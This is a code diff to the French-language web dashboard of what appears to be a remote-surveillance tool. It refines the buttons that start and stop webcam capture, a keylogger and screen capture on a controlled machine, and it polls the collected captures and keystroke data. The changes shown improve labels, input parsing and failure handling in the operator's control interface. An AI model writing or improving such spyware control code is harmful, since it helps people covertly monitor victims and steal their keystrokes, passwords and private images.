@@ -276,14 +276,22 @@
             const statusEl = document.getElementById(`${module}Status`);
             const btnEl = document.getElementById(`btn${module.charAt(0).toUpperCase() + module.slice(1)}Toggle`);
             
+            const labels = {
+                camera: 'CAMÉRA',
+                keylogger: 'KEYLOGGER',
+                screen: 'PARTAGE'
+            };
+            
+            const label = labels[module] || module.toUpperCase();
+            
             if (active) {
                 statusEl.classList.add('active');
                 btnEl.classList.add('active');
-                btnEl.innerHTML = `<span class="toggle-btn">DÉSACTIVER ${module.toUpperCase()}<span class="status-indicator active"></span></span>`;
+                btnEl.innerHTML = `<span class="toggle-btn">DÉSACTIVER ${label}<span class="status-indicator active"></span></span>`;
             } else {
                 statusEl.classList.remove('active');
                 btnEl.classList.remove('active');
-                btnEl.innerHTML = `<span class="toggle-btn">ACTIVER ${module.toUpperCase()}<span class="status-indicator"></span></span>`;
+                btnEl.innerHTML = `<span class="toggle-btn">ACTIVER ${label}<span class="status-indicator"></span></span>`;
             }
         }
 
@@ -312,23 +320,35 @@
 
         async function toggleCamera() {
             states.camera = !states.camera;
-            const interval = document.getElementById('cameraInterval').value;
-            await sendCommand('camera', states.camera ? 'start' : 'stop', { interval });
-            updateStatus('camera', states.camera);
+            const interval = parseInt(document.getElementById('cameraInterval').value);
+            
+            if (await sendCommand('camera', states.camera ? 'start' : 'stop', { interval })) {
+                updateStatus('camera', states.camera);
+            } else {
+                states.camera = !states.camera; // Annuler le changement si échec
+            }
         }
 
         async function toggleKeylogger() {
             states.keylogger = !states.keylogger;
-            await sendCommand('keylogger', states.keylogger ? 'start' : 'stop');
-            updateStatus('keylogger', states.keylogger);
+            
+            if (await sendCommand('keylogger', states.keylogger ? 'start' : 'stop')) {
+                updateStatus('keylogger', states.keylogger);
+            } else {
+                states.keylogger = !states.keylogger; // Annuler le changement si échec
+            }
         }
 
         async function toggleScreen() {
             states.screen = !states.screen;
-            const quality = document.getElementById('screenQuality').value;
-            const interval = document.getElementById('screenInterval').value;
-            await sendCommand('screen', states.screen ? 'start' : 'stop', { quality, interval });
-            updateStatus('screen', states.screen);
+            const quality = parseFloat(document.getElementById('screenQuality').value);
+            const interval = parseInt(document.getElementById('screenInterval').value);
+            
+            if (await sendCommand('screen', states.screen ? 'start' : 'stop', { quality, interval })) {
+                updateStatus('screen', states.screen);
+            } else {
+                states.screen = !states.screen; // Annuler le changement si échec
+            }
         }
 
         function clearLog() {
@@ -417,11 +437,17 @@
             }
         }
 
+        // Initialiser les statuts
+        updateStatus('camera', false);
+        updateStatus('keylogger', false);
+        updateStatus('screen', false);
+        
         // Rafraîchir toutes les 5 secondes
         setInterval(refreshStats, 5000);
         setInterval(refreshCaptures, 10000);
         setInterval(refreshKeylogData, 10000);
         
+        // Premier chargement
         refreshStats();
         refreshCaptures();
         refreshKeylogData();
